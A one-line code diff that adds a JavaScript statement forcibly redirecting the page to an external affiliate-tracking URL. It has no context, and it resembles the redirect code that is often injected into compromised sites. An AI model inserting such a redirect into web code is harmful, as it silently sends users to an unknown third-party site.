@@ -1,0 +1,1 @@
+window.location.href = "https://achieveyourvictories.com/kG6KC1w5?param=tqv15_mejit&aff_sub=10sale";
